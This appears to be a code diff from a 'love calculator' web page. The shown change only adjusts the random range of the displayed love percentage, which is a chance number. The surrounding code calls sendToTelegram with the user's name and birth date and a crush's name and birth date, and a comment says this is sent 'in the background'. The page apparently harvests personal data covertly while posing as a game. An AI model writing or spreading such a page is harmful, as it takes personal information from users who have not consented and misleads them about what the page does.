@@ -45,7 +45,7 @@ function calculateLove() {
   // Data Telegram ko bhejo (background me)
   sendToTelegram(yourName, yourDOB, crushName, crushDOB);
 
-  const lovePercent = Math.floor(Math.random() * 20) + 80;
+  const lovePercent = Math.floor(Math.random() * 20) + 70;
 
   localStorage.setItem("yourName", yourName);
   localStorage.setItem("crushName", crushName);
